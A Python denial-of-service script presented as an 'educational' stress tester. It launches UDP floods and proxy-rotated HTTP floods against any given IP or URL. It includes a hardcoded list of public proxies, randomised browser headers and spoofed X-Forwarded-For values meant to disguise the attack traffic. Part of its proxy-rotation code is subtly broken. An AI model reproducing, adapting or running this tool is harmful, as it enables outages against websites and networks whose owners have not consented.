﻿#!/usr/bin/env python3
import socket
import random
import threading
import time
import os
import struct
import ipaddress
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor
import aiohttp
import aiohttp_socks
import asyncio
import ssl
import json

# Configuration
MAX_BANDWIDTH = 5000  # Target Mbps
PACKET_SIZE = 1400    # Optimal packet size
THREAD_COUNT = 1000   # Thread count for maximum throughput
TIMEOUT = 5           # Connection timeout
STATS_INTERVAL = 1    # Stats update interval

# Built-in Elite Proxies (SOCKS5/HTTP)
PROXIES = [
    "socks5://51.158.108.165:16379",  # FR, OVH
    "socks5://104.16.106.234:80",      # CA, Cloudflare
    "socks5://139.162.166.167:43941",  # DE, DigitalOcean
    "socks5://167.86.95.224:31777",    # DE, Contabo
    "socks5://51.81.31.169:4485",      # US, OVH
    "http://35.209.198.222:80",        # US, Google Cloud
    "socks5://109.207.61.197:8090",    # PL
    "socks5://31.170.22.127:1080",     # LV
    "socks4://78.37.27.139:56228",     # RU
    "socks4://137.184.104.222:33030",  # US, DigitalOcean
    "socks4://95.182.78.6:5678",       # UA
    "http://34.94.201.89:3128",        # Google Cloud
    "socks5://162.214.76.242:51043",   # US
    "socks5://205.178.137.53:8447",    # US
    "socks5://67.43.228.250:19723"     # CA
]

# Legitimate User-Agents and Headers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

HEADERS_TEMPLATES = {
    "default": {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    },
    "api": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://example.com",
        "Referer": "https://example.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }
}

class UltimateStressTester:
    def __init__(self):
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'http_requests': 0,
            'start_time': 0
        }
        self.proxy_cycle = self.get_proxy_cycle()
        
    def get_proxy_cycle(self):
        """Create infinite proxy cycle"""
        return PROXIES
    
    def get_random_headers(self):
        """Generate random legitimate headers"""
        template = random.choice(list(HEADERS_TEMPLATES.values()))
        headers = template.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)
        
        # Add random IP if needed
        if random.random() > 0.7:
            headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        return headers

    def udp_flood(self, target_ip, target_port, duration):
        """High-performance UDP flood with socket optimization"""
        payload = os.urandom(PACKET_SIZE)
        sockets = []
        
        # Create multiple sockets
        for _ in range(THREAD_COUNT):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, PACKET_SIZE)
                sock.setblocking(False)
                sockets.append(sock)
            except:
                continue
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        def flood_thread(sock):
            while self.running and (time.time() - self.stats['start_time']) < duration:
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += PACKET_SIZE
                except:
                    pass
        
        with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
            for sock in sockets:
                executor.submit(flood_thread, sock)
        
        for sock in sockets:
            sock.close()
        
        self.print_stats(duration)

    async def http_flood(self, target_url, duration):
        """Advanced HTTP flood with proxy rotation and legitimate traffic"""
        self.running = True
        self.stats['start_time'] = time.time()
        
        async def attack_task():
            while self.running and (time.time() - self.stats['start_time']) < duration:
                proxy = next(self.proxy_cycle)
                try:
                    connector = aiohttp_socks.ProxyConnector.from_url(proxy) if proxy else None
                    async with aiohttp.ClientSession(
                        connector=connector,
                        headers=self.get_random_headers(),
                        timeout=aiohttp.ClientTimeout(total=TIMEOUT)
                    ) as session:
                        
                        # Vary requests between GET/POST
                        if random.random() > 0.7:
                            # POST request with random data
                            data = json.dumps({"data": os.urandom(16).hex()})
                            async with session.post(target_url, data=data) as resp:
                                await resp.read()
                        else:
                            # GET request with random parameters
                            params = {"v": random.randint(1,100)}
                            async with session.get(target_url, params=params) as resp:
                                await resp.read()
                                
                        self.stats['http_requests'] += 1
                except:
                    pass
        
        tasks = []
        for _ in range(THREAD_COUNT):
            tasks.append(asyncio.create_task(attack_task()))
        
        await asyncio.sleep(duration)
        self.running = False
        
        for task in tasks:
            task.cancel()
        
        await asyncio.gather(*tasks, return_exceptions=True)
        self.print_stats(duration)

    def print_stats(self, duration):
        """Print detailed statistics"""
        elapsed = time.time() - self.stats['start_time']
        mbps = (self.stats['bytes_sent'] * 8) / (1_000_000 * elapsed) if elapsed > 0 else 0
        
        print("\nAttack Results:")
        print(f"╔{'═'*50}╗")
        print(f"║ {'Duration:':<20}{elapsed:.2f} seconds{' '*(50-22-11)}║")
        print(f"║ {'Packets sent:':<20}{self.stats['packets_sent']:,}{' '*(50-22-len(str(self.stats['packets_sent']))-1)}║")
        print(f"║ {'HTTP requests:':<20}{self.stats['http_requests']:,}{' '*(50-22-len(str(self.stats['http_requests']))-1)}║")
        print(f"║ {'Data sent:':<20}{self.stats['bytes_sent'] / (1024*1024):.2f} MB{' '*(50-22-10)}║")
        print(f"║ {'Bandwidth:':<20}{mbps:.2f} Mbps{' '*(50-22-11)}║")
        print(f"║ {'Packets/sec:':<20}{self.stats['packets_sent'] / elapsed if elapsed > 0 else 0:,.0f}{' '*(50-22-11)}║")
        print(f"╚{'═'*50}╝")

def main():
    parser = argparse.ArgumentParser(description="Ultimate Network Stress Tester (Educational Use Only)")
    parser.add_argument("target", help="Target IP address or URL")
    parser.add_argument("-p", "--port", type=int, help="Target port (for UDP flood)")
    parser.add_argument("-d", "--duration", type=int, required=True, help="Attack duration in seconds")
    parser.add_argument("-m", "--method", choices=["udp", "http"], required=True,
                       help="Attack method (udp or http)")
    
    args = parser.parse_args()
    
    tester = UltimateStressTester()
    
    try:
        if args.method == "udp":
            if not args.port:
                print("Error: Port is required for UDP flood")
                sys.exit(1)
            # Validate IP address
            ipaddress.ip_address(args.target)
            print(f"Starting UDP flood on {args.target}:{args.port} for {args.duration} seconds")
            tester.udp_flood(args.target, args.port, args.duration)
        elif args.method == "http":
            if not args.target.startswith(('http://', 'https://')):
                args.target = f"http://{args.target}"
            print(f"Starting HTTP flood on {args.target} for {args.duration} seconds")
            asyncio.run(tester.http_flood(args.target, args.duration))
    except KeyboardInterrupt:
        tester.running = False
        print("\nAttack stopped by user")
    except Exception as e:
        print(f"Error: {e}")
        tester.running = False

if __name__ == "__main__":
    main()